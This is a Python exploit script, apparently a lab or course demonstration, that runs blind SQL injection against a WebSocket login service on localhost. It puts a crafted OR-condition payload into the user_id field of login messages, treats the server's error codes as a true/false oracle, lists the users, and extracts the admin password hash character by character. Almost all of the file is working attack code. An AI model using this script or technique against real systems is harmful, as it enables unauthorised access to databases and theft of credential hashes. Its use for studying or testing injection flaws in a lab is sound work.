#!/usr/bin/env python3
"""
IMPROVED SQL INJECTION - BLIND DATA EXTRACTION
This demonstrates how to successfully extract data using blind SQL injection
when direct UNION attacks don't work.
"""

import asyncio
import websockets
import json
import time
import string

class BlindSQLInjection:
    def __init__(self, server_url: str = "ws://127.0.0.1:8765"):
        self.server_url = server_url
        
    async def test_blind_condition(self, condition: str) -> bool:
        """
        Test a SQL condition and return True if it's true, False if false.
        We use timing differences to determine the result.
        """
        # Payload that will cause different behavior based on condition
        payload = f"admin' OR ({condition}) AND (SELECT COUNT(*) FROM users) > 0 --"
        
        try:
            start_time = time.time()
            async with websockets.connect(self.server_url) as websocket:
                # Send login attempt
                hello_msg = {
                    "type": "USER_HELLO",
                    "from": payload,
                    "to": "",
                    "ts": int(time.time() * 1000),
                    "payload": {"client": "blind-sqli"}
                }
                await websocket.send(json.dumps(hello_msg))
                
                login_msg = {
                    "type": "USER_LOGIN",
                    "ts": int(time.time() * 1000),
                    "payload": {
                        "user_id": payload,
                        "password": "test"
                    }
                }
                await websocket.send(json.dumps(login_msg))
                
                # Get response
                try:
                    response = await asyncio.wait_for(websocket.recv(), timeout=3.0)
                    response = await asyncio.wait_for(websocket.recv(), timeout=3.0)  # Get login response
                    response_data = json.loads(response)
                    
                    # Check if we got BAD_KEY (condition true) vs USER_NOT_FOUND (condition false)
                    if response_data.get('payload', {}).get('code') == 'BAD_KEY':
                        return True
                    else:
                        return False
                        
                except asyncio.TimeoutError:
                    return False
                    
        except Exception as e:
            print(f"Error testing condition: {e}")
            return False

    async def extract_database_info(self):
        """
        Extract database information using blind SQL injection.
        """
        print("🔍 BLIND SQL INJECTION - DATABASE RECONNAISSANCE")
        print("=" * 60)
        
        # Test if we can extract basic info
        print("Testing basic database access...")
        
        # Count total users
        for i in range(1, 10):
            condition = f"(SELECT COUNT(*) FROM users) = {i}"
            if await self.test_blind_condition(condition):
                print(f"✅ Total users in database: {i}")
                break
        
        print("\nTesting for specific users...")
        test_users = ["admin", "alice", "bob", "testuser1", "testuser2", "testuser3"]
        
        for user in test_users:
            condition = f"(SELECT COUNT(*) FROM users WHERE user_id='{user}') = 1"
            if await self.test_blind_condition(condition):
                print(f"✅ User '{user}' exists in database")
            else:
                print(f"❌ User '{user}' does not exist")
                
    async def extract_password_length(self, username: str) -> int:
        """
        Extract the length of a user's password hash.
        """
        print(f"\n🔍 Extracting password hash length for user: {username}")
        
        for length in range(1, 100):
            condition = f"(SELECT LENGTH(pake_password) FROM users WHERE user_id='{username}') = {length}"
            if await self.test_blind_condition(condition):
                print(f"✅ Password hash length for {username}: {length}")
                return length
                
        print(f"❌ Could not determine password hash length for {username}")
        return 0
        
    async def extract_password_char(self, username: str, position: int) -> str:
        """
        Extract a single character from the password hash at given position.
        """
        # Test printable ASCII characters
        for char in string.printable:
            if char in ["'", '"', "\\", "%"]:  # Skip problematic characters
                continue
                
            condition = f"(SELECT SUBSTR(pake_password, {position}, 1) FROM users WHERE user_id='{username}') = '{char}'"
            if await self.test_blind_condition(condition):
                return char
                
        return "?"
        
    async def extract_full_password_hash(self, username: str):
        """
        Extract the complete password hash for a user.
        """
        print(f"\n🎯 EXTRACTING FULL PASSWORD HASH FOR: {username}")
        print("-" * 50)
        
        # First get the length
        hash_length = await self.extract_password_length(username)
        if hash_length == 0:
            return None
            
        # Extract each character
        password_hash = ""
        for pos in range(1, min(hash_length + 1, 50)):  # Limit to first 50 chars for demo
            char = await self.extract_password_char(username, pos)
            password_hash += char
            print(f"Position {pos:2d}: '{char}' → Hash so far: {password_hash}")
            
            # Add small delay to avoid overwhelming the server
            await asyncio.sleep(0.1)
            
        print(f"\n✅ EXTRACTED HASH: {password_hash}")
        return password_hash

async def main():
    print("🚨 BLIND SQL INJECTION DEMONSTRATION")
    print("This shows how to successfully extract data when UNION attacks fail")
    print("=" * 70)
    
    attacker = BlindSQLInjection()
    
    # Basic database reconnaissance
    await attacker.extract_database_info()
    
    # Try to extract password hash for a known user
    await attacker.extract_full_password_hash("admin")

if __name__ == "__main__":
    asyncio.run(main())